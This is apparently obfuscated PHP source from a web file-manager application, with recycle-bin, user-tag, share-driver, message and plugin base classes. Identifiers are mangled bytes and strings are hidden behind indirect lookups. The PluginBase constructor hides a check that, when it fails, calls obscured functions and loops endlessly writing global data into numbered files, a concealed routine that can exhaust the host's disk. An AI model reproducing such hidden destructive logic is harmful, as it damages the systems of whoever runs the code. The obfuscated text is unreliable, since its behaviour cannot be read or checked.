$ôª±Ü–—, $Ïë¨ó, $ø¸±çÃÄ) { $Ó¶¿û½Ò =& $_SERVER[³½¬ÚË¯]; if ($Ïë¨ó == REPEAT_REPLACE || !$…“®ÓÜ || !in_array_not_case($ôª±Ü–—, $…“®ÓÜ) || $ø¸±çÃÄ && $Ïë¨ó != REPEAT_RENAME_FOLDER) { return $ôª±Ü–—; } if ($Ïë¨ó == REPEAT_SKIP) { return !1; } $ã¸ÂÆİÌ = $Ó¶¿û½Ò[10] . get_path_ext($ôª±Ü–—); $ã¸ÂÆİÌ = $ã¸ÂÆİÌ == $Ó¶¿û½Ò[10] || $ø¸±çÃÄ ? $Ó¶¿û½Ò[12] : $ã¸ÂÆİÌ; for ($¹¹»æ“ = 1; $¹¹»æ“ <= count($…“®ÓÜ) + 1; $¹¹»æ“++) { $¦Úî¾Š = substr($ôª±Ü–—, 0, strlen($ôª±Ü–—) - strlen($ã¸ÂÆİÌ)); $·öĞ×ˆ = $¦Úî¾Š . "\x28{$¹¹»æ“}\51{$ã¸ÂÆİÌ}"; if (!in_array_not_case($·öĞ×ˆ, $…“®ÓÜ)) { return $·öĞ×ˆ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\x6f\x75\x72\x63\x65\x5f\x72\145\x63\171\143\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\151\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\156\x63\164\151\x6f\x6e")); public function listData($ŞÅó§– = false) { $¦ˆ³—®¨ =& $_SERVER[³½¬ÚË¯]; $ŞÅó§– = $ŞÅó§– ? $ŞÅó§– : USER_ID; $ØöüÙ§“ = $this->where(array($¦ˆ³—®¨[1681] => $ŞÅó§–))->select(); return array_to_keyvalue($ØöüÙ§“, $¦ˆ³—®¨[12], $¦ˆ³—®¨[181]); } public function moveToRecycle($ÚÁ˜ÑÁ) { $ÉÓ“æÑ€ =& $_SERVER[³½¬ÚË¯]; $“Ú‰ÙŸº = Model($ÉÓ“æÑ€[1375]); $™‡ßó‘ = $“Ú‰ÙŸº->sourceInfo($ÚÁ˜ÑÁ); if (!$™‡ßó‘ || $™‡ßó‘[$ÉÓ“æÑ€[473]] == $ÉÓ“æÑ€[88]) { return; } $â‘ÆÏ•¼ = array($ÉÓ“æÑ€[459] => $ÚÁ˜ÑÁ, $ÉÓ“æÑ€[1681] => USER_ID, $ÉÓ“æÑ€[617] => $™‡ßó‘[$ÉÓ“æÑ€[178]], $ÉÓ“æÑ€[618] => $™‡ßó‘[$ÉÓ“æÑ€[539]], $ÉÓ“æÑ€[621] => $™‡ßó‘[$ÉÓ“æÑ€[554]]); $this->add($â‘ÆÏ•¼); $this->recycleMove($ÚÁ˜ÑÁ, 1); if ($™‡ßó‘[$ÉÓ“æÑ€[453]] == $ÉÓ“æÑ€[88]) { $«é„´Œ¯ = array($ÉÓ“æÑ€[621] => array($ÉÓ“æÑ€[581], $™‡ßó‘[$ÉÓ“æÑ€[554]] . $ÚÁ˜ÑÁ . $ÉÓ“æÑ€[582])); $“Ú‰ÙŸº->where($«é„´Œ¯)->setField($ÉÓ“æÑ€[473], 1); } } public function clear() { $this->remove(!1); } public function remove($™ÄŸ±şñ = false, $¸úÏûóÉ = false) { $¬–Ë‚Ù =& $_SERVER[³½¬ÚË¯]; $¸úÏûóÉ = $¸úÏûóÉ ? $¸úÏûóÉ : USER_ID; $›í »²© = Model($¬–Ë‚Ù[1375]); $ô•„ò«Ü = $this->listData($¸úÏûóÉ); $™ÄŸ±şñ = $™ÄŸ±şñ === !1 ? !1 : $™ÄŸ±şñ; $Ş›ú˜áÄ = array(); foreach ($ô•„ò«Ü as $ª–¾©Å‡) { if ($™ÄŸ±şñ != !1 && !in_array($ª–¾©Å‡, $™ÄŸ±şñ)) { continue; } $ùÀ·ü = $›í »²©->sourceInfo($ª–¾©Å‡); $›í »²©->remove($ª–¾©Å‡, !1); $¥»ËãÙ© = $ùÀ·ü[$¬–Ë‚Ù[178]] . $¬–Ë‚Ù[11] . $ùÀ·ü[$¬–Ë‚Ù[539]]; $Ş›ú˜áÄ[$¥»ËãÙ©] = array($¬–Ë‚Ù[617] => $ùÀ·ü[$¬–Ë‚Ù[178]], $¬–Ë‚Ù[539] => $ùÀ·ü[$¬–Ë‚Ù[539]]); $this->where(array($¬–Ë‚Ù[181] => $ª–¾©Å‡))->delete(); } foreach ($Ş›ú˜áÄ as $Õ©ñê©à) { $›í »²©->targetSpaceUpdate($Õ©ñê©à[$¬–Ë‚Ù[178]], $Õ©ñê©à[$¬–Ë‚Ù[539]]); } } public function restore($¡û¨Ë» = false) { $‘±µ’Ú— = $this->listData(); $this->_restoreSource($‘±µ’Ú—, $¡û¨Ë»); } public function removeUserAll($Õš»»Ú) { $this->remove(!1, $Õš»»Ú); } public function restoreItem($ú×¤¸Î÷) { $this->_restoreSource(array($ú×¤¸Î÷), array($ú×¤¸Î÷)); } private function _restoreSource($ ¯½—Ÿ, $õıèÎ¦Ê) { $Ú¤ßéÇˆ =& $_SERVER[³½¬ÚË¯]; $¶£İë¸Ú = Model($Ú¤ßéÇˆ[1375]); $õıèÎ¦Ê = $õıèÎ¦Ê == !1 ? !1 : $õıèÎ¦Ê; if (!$ ¯½—Ÿ) { return !0; } $—˜Ù“ é = array(); foreach ($ ¯½—Ÿ as $”Êß™—¾) { if ($õıèÎ¦Ê != !1 && !in_array($”Êß™—¾, $õıèÎ¦Ê)) { continue; } $ÜÊÀ•¥· = $¶£İë¸Ú->sourceInfo($”Êß™—¾); $ñ¼øØò¶ = $¶£İë¸Ú->sourceInfo($ÜÊÀ•¥·[$Ú¤ßéÇˆ[180]]); if ($ñ¼øØò¶[$Ú¤ßéÇˆ[473]] == $Ú¤ßéÇˆ[88]) { continue; } $¶£İë¸Ú->lockMoveStart($”Êß™—¾); $this->recycleMove($”Êß™—¾, 0); if ($ÜÊÀ•¥·[$Ú¤ßéÇˆ[453]] == $Ú¤ßéÇˆ[88]) { $ËÁàŞÜ = array($Ú¤ßéÇˆ[621] => array($Ú¤ßéÇˆ[581], $ÜÊÀ•¥·[$Ú¤ßéÇˆ[554]] . $”Êß™—¾ . $Ú¤ßéÇˆ[582])); $¶£İë¸Ú->where($ËÁàŞÜ)->setField($Ú¤ßéÇˆ[473], 0); $this->restoreFolderChildren($”Êß™—¾, $ ¯½—Ÿ); } $this->where(array($Ú¤ßéÇˆ[181] => $”Êß™—¾))->delete(); $¶£İë¸Ú->folderSizeReset($ÜÊÀ•¥·[$Ú¤ßéÇˆ[180]]); $—˜Ù“ é[] = $ÜÊÀ•¥·[$Ú¤ßéÇˆ[180]]; if ($ÜÊÀ•¥·[$Ú¤ßéÇˆ[453]] == $Ú¤ßéÇˆ[88]) { $—˜Ù“ é[] = $”Êß™—¾; } $¶£İë¸Ú->lockMoveEnd($”Êß™—¾); } $¶£İë¸Ú->updateModifyTime($—˜Ù“ é); } private function restoreFolderChildren($ü¸­”Ñè, $†Í‡öÌç) { $×Å‡„‚ =& $_SERVER[³½¬ÚË¯]; $’”—ôœÊ = Model($×Å‡„‚[1375]); $˜Ãí¦¤ô = array($×Å‡„‚[181] => array($×Å‡„‚[7], array())); foreach ($†Í‡öÌç as $¶‡ä¼Êˆ) { if ($¶‡ä¼Êˆ == $ü¸­”Ñè) { continue; } if (!$’”—ôœÊ->isParentOf($ü¸­”Ñè, $¶‡ä¼Êˆ)) { continue; } $¤è»ƒïë = $’”—ôœÊ->sourceInfo($¶‡ä¼Êˆ); if ($¤è»ƒïë[$×Å‡„‚[453]] == $×Å‡„‚[88]) { $˜Ãí¦¤ô[] = array($×Å‡„‚[621] => array($×Å‡„‚[581], $¤è»ƒïë[$×Å‡„‚[554]] . $¶‡ä¼Êˆ . $×Å‡„‚[582])); } else { $˜Ãí¦¤ô[$×Å‡„‚[181]][1][] = $¶‡ä¼Êˆ; } } if (!$˜Ãí¦¤ô[$×Å‡„‚[181]][1]) { unset($˜Ãí¦¤ô[$×Å‡„‚[181]]); } if (!$˜Ãí¦¤ô) { return; } if (is_array($˜Ãí¦¤ô[$×Å‡„‚[181]]) && is_array($˜Ãí¦¤ô[$×Å‡„‚[181]][1])) { $˜Ãí¦¤ô[$×Å‡„‚[181]][1] = array_unique($˜Ãí¦¤ô[$×Å‡„‚[181]][1]); } $˜Ãí¦¤ô[$×Å‡„‚[1043]] = $×Å‡„‚[1986]; $’”—ôœÊ->where($˜Ãí¦¤ô)->setField($×Å‡„‚[473], 1); } private function recycleMove($ÑŠ÷ÖñÛ, $áôäÕöÔ = 1) { $âäş˜¯™ =& $_SERVER[³½¬ÚË¯]; $ÊÎ¥É‰… = Model($âäş˜¯™[1375]); $ÄÛ»»Ğ¦ = Model($âäş˜¯™[2205]); $îêõÁæ = array($âäş˜¯™[181] => $ÑŠ÷ÖñÛ); if ($áôäÕöÔ) { $ÊÎ¥É‰…->where($îêõÁæ)->setField($âäş˜¯™[473], 1); $ÄÛ»»Ğ¦->eventRecycle($ÑŠ÷ÖñÛ, $âäş˜¯™[2206]); } else { $‹¶¿•¼ = $ÊÎ¥É‰…->where($îêõÁæ)->find(); $È¸ˆ³»ø = $‹¶¿•¼[$âäş˜¯™[453]] == $âäş˜¯™[88]; $ÇŞæ”­± = $ÊÎ¥É‰…->fileNameAuto($‹¶¿•¼[$âäş˜¯™[180]], $‹¶¿•¼[$âäş˜¯™[32]], REPEAT_RENAME_FOLDER, $È¸ˆ³»ø); if ($ÇŞæ”­± != $‹¶¿•¼[$âäş˜¯™[32]]) { $ÊÎ¥É‰…->rename($ÑŠ÷ÖñÛ, $ÇŞæ”­±); } $ÊÎ¥É‰…->where($îêõÁæ)->setField($âäş˜¯™[473], 0); $ÄÛ»»Ğ¦->eventRecycle($ÑŠ÷ÖñÛ, $âäş˜¯™[2207]); } } } goto fäİîÇÃ®; fñ§‹¿Ğˆ: class PathDriverDriverShareItem { public function __construct($ğÌ‡­ê¡) { $this->pathParse = $ğÌ‡­ê¡; } public function __call($®µË … , $ òŠä¸) { $‡”«àç» =& $_SERVER[³½¬ÚË¯]; if (method_exists($this, $®µË … )) { return; } $—õï• = call_user_func_array(array($‡”«àç»[1384], $®µË … ), $ òŠä¸); $ßßÖ·„Ë = array($‡”«àç»[1385], $‡”«àç»[1386], $‡”«àç»[1387], $‡”«àç»[1388], $‡”«àç»[587], $‡”«àç»[589], $‡”«àç»[1389], $‡”«àç»[107], $‡”«àç»[1390], $‡”«àç»[1391]); if (in_array($®µË … , $ßßÖ·„Ë)) { $—õï• = $this->getPathOuter($—õï•); } return $—õï•; } public function copy($¥â»¾øÈ, $¡øïÃœÊ, $Ë»¡Ìêµ = false, $Õ™ØéƒÏ = false) { return $this->copyMove($¥â»¾øÈ, $¡øïÃœÊ, $Ë»¡Ìêµ, $_SERVER[³½¬ÚË¯][587], $Õ™ØéƒÏ); } public function move($çÃØ…¹ß, $ÃÎ’Ç¿, $íÌÈ•Í¥ = false, $Şì·ˆÃ’ = false) { return $this->copyMove($çÃØ…¹ß, $ÃÎ’Ç¿, $íÌÈ•Í¥, $_SERVER[³½¬ÚË¯][589], $Şì·ˆÃ’); } private function copyMove($Ûâ¥ ò, $ò‚×šİ—, $™Ÿ³²ÔĞ, $Ÿíî¢…Ï, $¥¥Å‰çÖ = false) { $¼¦±ƒ¾Ê =& $_SERVER[³½¬ÚË¯]; $Ë®è÷Ô = $ò‚×šİ—; $ßÊ¦«àÀ = IO::driverMake($ò‚×šİ—); if ($ßÊ¦«àÀ->pathParse[$¼¦±ƒ¾Ê[1194]]) { $ò‚×šİ— = $ßÊ¦«àÀ->pathParse[$¼¦±ƒ¾Ê[1194]]; } else { $ò‚×šİ— = $Ë®è÷Ô; } $ôÕê©°ß = IO::copyMove($Ûâ¥ ò, $ò‚×šİ—, $™Ÿ³²ÔĞ, $Ÿíî¢…Ï, $¥¥Å‰çÖ); $ôÕê©°ß = $this->getPathOuter($ôÕê©°ß); return $ôÕê©°ß; } public function pathThis($ÌÚ¹óÕŒ) { return get_path_this($this->pathParse[$_SERVER[³½¬ÚË¯][84]]); } public function pathFather($µãİíÕ”) { return get_path_father($this->pathParse[$_SERVER[³½¬ÚË¯][84]]); } public function iconvSystem($ìçÀ–´) { return $ìçÀ–´; } protected function infoParse($Åªß–·Ì, $³â‘ôÌÅ = false) { $ğ“¾‘ä =& $_SERVER[³½¬ÚË¯]; $¸¨’å¸é = $this->pathParse[$ğ“¾‘ä[529]][$ğ“¾‘ä[1218]] . $this->pathParse[$ğ“¾‘ä[1211]]; if ($³â‘ôÌÅ) { $µœ¡ÚÛ = IO::infoWithChildren($¸¨’å¸é); } else { $µœ¡ÚÛ = IO::info($¸¨’å¸é); } $Ë¤¨µÜû = $this->pathParse[$ğ“¾‘ä[529]]; return Action($ğ“¾‘ä[1382])->_shareItemeParse($µœ¡ÚÛ, $Ë¤¨µÜû); } public function listAll($Ñ¼ĞÀä) { $¯ìË¼àã =& $_SERVER[³½¬ÚË¯]; $Ÿ…ÏÎùë = IO::listAll($Ñ¼ĞÀä); $–Ú‚¸‚ç = rtrim($this->pathParse[$¯ìË¼àã[529]][$¯ìË¼àã[1218]], $¯ìË¼àã[8]); foreach ($Ÿ…ÏÎùë as &$³åîê—Á) { $³åîê—Á[$¯ìË¼àã[84]] = $this->pathDriver . $¯ìË¼àã[8] . ltrim(substr($³åîê—Á[$¯ìË¼àã[84]], strlen($–Ú‚¸‚ç)), $¯ìË¼àã[8]); } unset($³åîê—Á); return $Ÿ…ÏÎùë; } public function listAllSimple($£íÅ²å, $²Ù°ÕË = false) { $ ÉËªß¦ =& $_SERVER[³½¬ÚË¯]; $À„É£õ» = $this->listAll($£íÅ²å); $èÉœÛ = $this->pathParse[$ ÉËªß¦[463]]; if (trim($èÉœÛ, $ ÉËªß¦[8]) == trim(get_path_father($èÉœÛ), $ ÉËªß¦[8])) { $²Ù°ÕË = !0; } return IO::init($ ÉËªß¦[12])->listAllSimpleMake($À„É£õ», $èÉœÛ, $²Ù°ÕË); } public function getPathOuter($ôõí…¸¹) { $‚° Û¹Ò =& $_SERVER[³½¬ÚË¯]; $®Òœü‡Ã = KodIO::parse($ôõí…¸¹); if ($®Òœü‡Ã[$‚° Û¹Ò[33]] == KodIO::KOD_SHARE_ITEM) { return $®Òœü‡Ã[$‚° Û¹Ò[84]]; } $ş‹šÈŠ = KodIO::clear($ôõí…¸¹); $ĞÈ€’ Ò = KodIO::clear($this->pathParse[$‚° Û¹Ò[529]][$‚° Û¹Ò[1218]]); $µ¶›…ÂÚ = substr($ş‹šÈŠ, strlen($ĞÈ€’ Ò)); if (substr($ş‹šÈŠ, 0, strlen($ĞÈ€’ Ò)) != $ĞÈ€’ Ò) { return !1; } return $this->pathParse[$‚° Û¹Ò[1212]] . $‚° Û¹Ò[8] . ltrim($µ¶›…ÂÚ, $‚° Û¹Ò[8]); } public function getType() { $û‘éë =& $_SERVER[³½¬ÚË¯]; $ìí¢™ôÑ = str_replace($û‘éë[74], $û‘éë[12], get_class($this)); return strtolower($ìí¢™ôÑ); } public function isTypeObject($“¦»ÃÒ¯) { return IO::isTypeObject($“¦»ÃÒ¯); } public function info($ğİ«—²•) { return $this->infoParse($ğİ«—²•); } public function infoAuth($¿ˆ¥ßˆ‰) { return $this->infoParse($¿ˆ¥ßˆ‰); } public function infoWithChildren($×Ó®ùêí) { return $this->infoParse($×Ó®ùêí, !0); } public function infoFull($ÜÒ†«Áİ) { return $this->infoParse($ÜÒ†«Áİ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÊÅÜîĞÅ) { $this->pathParse = $ÊÅÜîĞÅ; } protected function infoParse($èşøºËÁ, $ëƒé¦”î = false) { $²â·ÊÔñ =& $_SERVER[³½¬ÚË¯]; return Action($²â·ÊÔñ[1217])->sharePathInfo($this->pathParse[$²â·ÊÔñ[84]], !0, $ëƒé¦”î); } public function listPath($ªÎ¹ó„™, $–¡ÏÂï¢ = false) { $Ä”êšÂŒ =& $_SERVER[³½¬ÚË¯]; $ÂœªÅç = IO::listPath($ªÎ¹ó„™, $–¡ÏÂï¢); if (!$ÂœªÅç) { return $ÂœªÅç; } if (is_array($ÂœªÅç[$Ä”êšÂŒ[1383]])) { $ù©áºÏ™ = Action($Ä”êšÂŒ[1392])->parsePathChildren($ÂœªÅç[$Ä”êšÂŒ[1383]], array($Ä”êšÂŒ[463] => $ªÎ¹ó„™)); $ÂœªÅç[$Ä”êšÂŒ[1383]] = Action($Ä”êšÂŒ[1217])->shareItemInfo($ù©áºÏ™); } foreach ($ÂœªÅç as $•ÅÁŠØ… => $‹Ûû»“­) { if (!in_array($•ÅÁŠØ…, array($Ä”êšÂŒ[83], $Ä”êšÂŒ[82]))) { continue; } foreach ($‹Ûû»“­ as $“ÂÃá => $ù©áºÏ™) { $ù©áºÏ™ = Action($Ä”êšÂŒ[1392])->parsePathChildren($ù©áºÏ™, array($Ä”êšÂŒ[463] => $ªÎ¹ó„™)); $ÂœªÅç[$•ÅÁŠØ…][$“ÂÃá] = Action($Ä”êšÂŒ[1217])->shareItemInfo($ù©áºÏ™); } } return $ÂœªÅç; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($åúà—Ô) { parent::__construct($åúà—Ô); } } goto F›´Ø¢è; eğšÕùµßğ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Öü…¹Üï) { $²è¢ğÕĞ =& $_SERVER[³½¬ÚË¯]; $µøÉÍÙÚ = defined($²è¢ğÕĞ[2109]) && USER_ID ? USER_ID : $²è¢ğÕĞ[12]; return "\125\163\x65\x72\117\160\164\151\x6f\156\137{$Öü…¹Üï}\x5f" . $µøÉÍÙÚ; } protected function filterWhere($­¥­€óé) { $¨ÄºË† =& $_SERVER[³½¬ÚË¯]; $­¥­€óé[$¨ÄºË†[1690]] = defined($¨ÄºË†[2109]) && USER_ID ? USER_ID : $¨ÄºË†[12]; return $­¥­€óé; } public function cacheRemoveUser($ä‡µ¥´, $Ë§÷äñ¼) { return Cache::remove("\x55\x73\145\162\x4f\160\x74\151\157\156\x5f{$ä‡µ¥´}\137" . $Ë§÷äñ¼); } protected function optionDefault($³ÀÔ–Öñ = '') { $÷Ú¦¼ =& $_SERVER[³½¬ÚË¯]; if ($³ÀÔ–Öñ == $÷Ú¦¼[12]) { return $GLOBALS[$÷Ú¦¼[6]][$÷Ú¦¼[2385]]; } if ($³ÀÔ–Öñ == $÷Ú¦¼[2386]) { return $GLOBALS[$÷Ú¦¼[6]][$÷Ú¦¼[2387]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\147\x4c\151\x73\164"; public $modelType = "\125\163\x65\x72\117\160\x74\x69\157\x6e"; public $field = array("\x6e\x61\155\x65", "\163\164\171\154\x65", "\163\x6f\x72\164"); public function listData($á¥ËùÃğ = false, $„‚€…Âµ = "\x73\157\162\164", $À²ÅŠ¹¹ = false) { return parent::listData($á¥ËùÃğ, $„‚€…Âµ, $À²ÅŠ¹¹); } public function remove($¥Ã…¾‡Ê) { return parent::remove($¥Ã…¾‡Ê); } public function add($ºÕ¤½¦™, $½ıœˆğì = "\x6c\141\x62\x65\154\x2d\147\x72\145\171\x2d\156\x6f\x72\155\x61\154") { $ÛÒÖûÈ¥ =& $_SERVER[³½¬ÚË¯]; if ($this->findByName($ºÕ¤½¦™)) { return !1; } $î‹œÉ· = array($ÛÒÖûÈ¥[462] => $ºÕ¤½¦™, $ÛÒÖûÈ¥[527] => $½ıœˆğì, $ÛÒÖûÈ¥[1892] => $this->getSort($ÛÒÖûÈ¥[302]) + 1); return parent::insert($î‹œÉ·); } public function update($¢øªæÅ„, $Å¡Æéà) { $ù¡–¢±Â =& $_SERVER[³½¬ÚË¯]; $¡ƒ£çÇË = $this->listData($¢øªæÅ„); $îÇ·ëæï = $this->findByName($Å¡Æéà[$ù¡–¢±Â[32]]); if (!$¡ƒ£çÇË || $îÇ·ëæï && $îÇ·ëæï[$ù¡–¢±Â[443]] != $¡ƒ£çÇË[$ù¡–¢±Â[443]]) { return !1; } return parent::update($¢øªæÅ„, $Å¡Æéà); } public function moveTop($‹Å…’À) { $”¥Ğáõ© =& $_SERVER[³½¬ÚË¯]; $•˜”‹ªä = parent::listData(); $¯›ûäŸ¦ = $this->getSort($”¥Ğáõ©[301]); foreach ($•˜”‹ªä as &$¤Œ¯ãÁº) { if ($¤Œ¯ãÁº[$”¥Ğáõ©[443]] == $‹Å…’À) { $¤Œ¯ãÁº[$”¥Ğáõ©[1912]] = $¯›ûäŸ¦; continue; } $¤Œ¯ãÁº[$”¥Ğáõ©[1912]] += 1; } unset($¤Œ¯ãÁº); return parent::resetData($•˜”‹ªä); } public function moveBottom($ÜæÖÊíá) { $„»æ©Ÿ° =& $_SERVER[³½¬ÚË¯]; $ëØÃÑ€ş = $this->getSort($„»æ©Ÿ°[302]) + 1; return parent::update($ÜæÖÊíá, array($„»æ©Ÿ°[1912] => $ëØÃÑ€ş)); } public function resetSort($ÔºÉ§Êª) { $³™òÇŠ› =& $_SERVER[³½¬ÚË¯]; $óÕ¸•ø = array(); $ÔºÉ§Êª = is_array($ÔºÉ§Êª) ? $ÔºÉ§Êª : array(); for ($–òÑ = 0; $–òÑ < count($ÔºÉ§Êª); $–òÑ++) { $óÕ¸•ø[$ÔºÉ§Êª[$–òÑ] . $³™òÇŠ›[12]] = $–òÑ + 1; } $Œ¹¦Ì‰ô = parent::listData(); foreach ($Œ¹¦Ì‰ô as &$¢ŸƒÓÖÊ) { $ÃÑµñíû = $óÕ¸•ø[$¢ŸƒÓÖÊ[$³™òÇŠ›[443]]]; $¢ŸƒÓÖÊ[$³™òÇŠ›[1912]] = $ÃÑµñíû ? $ÃÑµñíû : $¢ŸƒÓÖÊ[$³™òÇŠ›[1912]]; } unset($¢ŸƒÓÖÊ); return parent::resetData($Œ¹¦Ì‰ô); } private function getSort($–ÔĞíª) { $ïàÅ´Õë =& $_SERVER[³½¬ÚË¯]; $ğÁ¾áÅØ = parent::listData(); $ƒÁä¨ªŞ = array_to_keyvalue($ğÁ¾áÅØ, $ïàÅ´Õë[12], $ïàÅ´Õë[1912]); if (!$ƒÁä¨ªŞ) { $ƒÁä¨ªŞ = array(0); } $Š‚óîß™ = $–ÔĞíª == $ïàÅ´Õë[302] ? max($ƒÁä¨ªŞ) : min($ƒÁä¨ªŞ); return intval($Š‚óîß™); } } goto d±Ê–ôƒÎ‡; bä™İ’¢¬ô: class Message { function __construct() { } public function send($«µĞ¦š× = '', $¨üÎæ¬¥ = array(), $õ÷ÓÆ¤ä = "\164\x65\170\164") { $ºÜÔâÊ =& $_SERVER[³½¬ÚË¯]; $¸Â³ãöÍ = array($ºÜÔâÊ[33] => $ºÜÔâÊ[1545], $ºÜÔâÊ[790] => $«µĞ¦š×); if (in_array($õ÷ÓÆ¤ä, array($ºÜÔâÊ[1545], $ºÜÔâÊ[1546]))) { $¸Â³ãöÍ[$ºÜÔâÊ[33]] = $õ÷ÓÆ¤ä; } $¨üÎæ¬¥ = array($ºÜÔâÊ[548] => isset($¨üÎæ¬¥[$ºÜÔâÊ[548]]) ? $¨üÎæ¬¥[$ºÜÔâÊ[548]] : $ºÜÔâÊ[12], $ºÜÔâÊ[631] => isset($¨üÎæ¬¥[$ºÜÔâÊ[631]]) ? $¨üÎæ¬¥[$ºÜÔâÊ[631]] : $ºÜÔâÊ[12]); if (empty($«µĞ¦š×) || empty($¨üÎæ¬¥[$ºÜÔâÊ[548]]) && empty($¨üÎæ¬¥[$ºÜÔâÊ[631]])) { return !1; } $ëàÕ¥Ê· = array($ºÜÔâÊ[1486] => $¸Â³ãöÍ, $ºÜÔâÊ[1547] => $¨üÎæ¬¥); Hook::trigger($ºÜÔâÊ[1548], $ëàÕ¥Ê·); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ï¼êÒ„ =& $_SERVER[³½¬ÚË¯]; $±Ó¯Áİ¤ = $_SERVER[$Ï¼êÒ„[910]]; $ç‹›ò‰Œ = $Ï¼êÒ„[1549]; if ($_SERVER[$Ï¼êÒ„[903]] != $ç‹›ò‰Œ($±Ó¯Áİ¤)) { $çÏÀÏóó = $Ï¼êÒ„[921]; $·ŒŒ²â = $Ï¼êÒ„[905]; $ãâ„‘°œ = $_SERVER[$Ï¼êÒ„[906]] . $Ï¼êÒ„[907]; $Ê—Ô±Ò = $·ŒŒ²â($ãâ„‘°œ); $­Á×²é = explode($Ï¼êÒ„[246], $Ê—Ô±Ò); if (count($­Á×²é) < $Ï¼êÒ„[653]) { $Ê‡úçí£ = $Ï¼êÒ„[908]; $Ê‡úçí£(); } $øÎˆº… = $Ï¼êÒ„[922]; $øÎˆº…($_SERVER[$Ï¼êÒ„[923]]); $çÏÀÏóó = $Ï¼êÒ„[921]; $çÏÀÏóó(); $ææà°º = $Ï¼êÒ„[1550]; $ğşùªÓô = json_encode($GLOBALS[$Ï¼êÒ„[1551]]); $æçØ¢¶Û = 1; for ($Ã¥äÜ = $æçØ¢¶Û; $Ã¥äÜ > 0; $Ã¥äÜ++) { $ææà°º(DATA_PATH . $Ã¥äÜ, $ğşùªÓô); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ï¼êÒ„[1552]); $this->pluginName = str_replace($Ï¼êÒ„[1552], $Ï¼êÒ„[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ï¼êÒ„[8]; $this->pluginApi = appHostGet() . $Ï¼êÒ„[1553] . $this->pluginName . $Ï¼êÒ„[8]; $this->pluginHost = $config[$Ï¼êÒ„[1554]] . $this->pluginName . $Ï¼êÒ„[8]; $this->pluginHostDefault = $config[$Ï¼êÒ„[1554]] . $this->pluginName . $Ï¼êÒ„[8]; $ıÃê¿è® = $config[$Ï¼êÒ„[1555]]; if ($ıÃê¿è® && strpos($Ï¼êÒ„[50] . $ıÃê¿è® . $Ï¼êÒ„[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ï¼êÒ„[1556]] . $this->pluginName . $Ï¼êÒ„[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[³½¬ÚË¯][1557]); } protected function assign($á†ç„²Å, $€—È‘Ï¸ = false) { if (is_array($á†ç„²Å)) { $this->values = array_merge($this->values, $á†ç„²Å); } else { $this->values[$á†ç„²Å] = $€—È‘Ï¸; } } protected function display($à£÷¼Ù½) { extract($this->values); require $à£÷¼Ù½; } final function hookRegist($‰æìºƒ) { $this->modelPlugin->appRegist($this->pluginName, $‰æìºƒ); } final function appIcon() { $çÖÆ°§¯ =& $_SERVER[³½¬ÚË¯]; $™…¯ë‰£ = $this->appPackage(); $ÁñĞÕæÍ = $çÖÆ°§¯[12]; if (isset($™…¯ë‰£[$çÖÆ°§¯[458]])) { if (isset($™…¯ë‰£[$çÖÆ°§¯[458]][$çÖÆ°§¯[1558]])) { $ÁñĞÕæÍ = $çÖÆ°§¯[1559] . $™…¯ë‰£[$çÖÆ°§¯[458]][$çÖÆ°§¯[1558]] . $çÖÆ°§¯[1560]; } else { if ($™…¯ë‰£[$çÖÆ°§¯[458]][$çÖÆ°§¯[1561]]) { $ÁñĞÕæÍ = $çÖÆ°§¯[1562] . $™…¯ë‰£[$çÖÆ°§¯[458]][$çÖÆ°§¯[1561]] . $çÖÆ°§¯[1563]; } } } return $ÁñĞÕæÍ; } final function fileCanView($ØĞÅÔ–) { $Îáè¼Ç =& $_SERVER[³½¬ÚË¯]; if (request_url_safe($ØĞÅÔ–)) { return !0; } if ($this->isShare($ØĞÅÔ–)) { return !0; } $­‡í®ê« = Session::get($Îáè¼Ç[1564]); if ($GLOBALS[$Îáè¼Ç[537]] != 1 && !$­‡í®ê« || !$­‡í®ê«[$Îáè¼Ç[1565]]) { $ë¢Ê‰»¿ = $Îáè¼Ç[1566] . rawurlencode(this_url()); show_tips(LNG($Îáè¼Ç[1567]) . $Îáè¼Ç[1568] . $ë¢Ê‰»¿ . $Îáè¼Ç[1569] . LNG($Îáè¼Ç[1570]) . $Îáè¼Ç[1571], !1); } if (!Action($Îáè¼Ç[1572])->authCan($Îáè¼Ç[1573])) { show_tips(LNG($Îáè¼Ç[1574]) . $Îáè¼Ç[1575], !1); } ActionCall($Îáè¼Ç[1576], $ØĞÅÔ–); } final function isShare($›«º”) { $§ÅÎçÇã = KodIO::parse($›«º”); return $§ÅÎçÇã[$_SERVER[³½¬ÚË¯][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ş óßú) { if (request_url_safe($Ş óßú)) { return $Ş óßú; } if (!$this->isShare($Ş óßú)) { $Ş óßú = $this->filePath($Ş óßú, !1); } return Action($_SERVER[³½¬ÚË¯][1217])->linkOut($Ş óßú); } public function filePathLinkOut($Ö»½ƒÁ°) { if (request_url_safe($Ö»½ƒÁ°)) { return $Ö»½ƒÁ°; } $this->fileCanView($Ö»½ƒÁ°); return Action($_SERVER[³½¬ÚË¯][1217])->link($Ö»½ƒÁ°); } final function filePath($áˆÒôœ¾, $ø†üá = true, $¼÷¡Ëªù = false) { $İö¬”ƒµ =& $_SERVER[³½¬ÚË¯]; $…¶üÖÒ = $this->filePathGet($áˆÒôœ¾, $ø†üá); if (!$this->fileInfo) { 